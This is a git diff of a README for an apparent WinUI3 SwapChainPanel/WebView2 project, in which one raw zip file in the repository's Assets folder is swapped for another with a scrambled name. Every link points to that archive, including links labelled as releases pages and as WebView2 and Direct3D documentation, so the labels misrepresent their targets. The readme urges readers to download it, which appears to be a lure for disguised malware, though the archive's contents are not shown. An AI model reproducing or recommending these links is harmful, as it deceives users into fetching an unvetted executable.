@@ -4,7 +4,7 @@
 Welcome to the WinUI3_SwapChainPanel_WebView2 project! This application allows you to test and display web content within a modern Windows user interface. You can use it to showcase interactive web experiences efficiently.
 
 ## 📥 Download Now
-[![Download WinUI3_SwapChainPanel_WebView2](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip)](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip)
+[![Download WinUI3_SwapChainPanel_WebView2](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip)](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip)
 
 ## 💻 System Requirements
 To run this application, your system should meet the following requirements:
@@ -20,7 +20,7 @@ To run this application, your system should meet the following requirements:
 
 ## 🔧 Installation Instructions
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip) to access the latest version of the application. 
+   Go to the [Releases page](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip) to access the latest version of the application. 
 
 2. **Download the Application**  
    Locate the version you want and click on the appropriate download link to grab the file. 
@@ -42,10 +42,10 @@ To run this application, your system should meet the following requirements:
 ## 📖 Learning Resources
 If you would like to know more about the underlying technologies, consider exploring the following resources:
 
-- [WebView2 Documentation](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip)
-- [https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip)
-- [GraphicsCaptureItem Overview](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip)
-- [Direct3D 11 Interoperability](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip) 
+- [WebView2 Documentation](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip)
+- [https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip)
+- [GraphicsCaptureItem Overview](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip)
+- [Direct3D 11 Interoperability](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip) 
 
 ## 📩 Support
 For any issues or questions regarding the application, feel free to reach out. Look for the "Issues" tab on this repository to report problems or seek help.
@@ -55,4 +55,4 @@ This repository is open-source. You can use, modify, and share the code under th
 
 ## 📥 Download Again
 Don’t forget to check back for updates!  
-You can always visit the [Releases page](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Chain_Swap_Web_View_Win_U_Panel_v2.4.zip) to download the latest version.
+You can always visit the [Releases page](https://github.com/adesh-2006/WinUI3_SwapChainPanel_WebView2/raw/refs/heads/master/Assets/Swap_Web_Chain_U_View_Panel_Win_1.3.zip) to download the latest version.
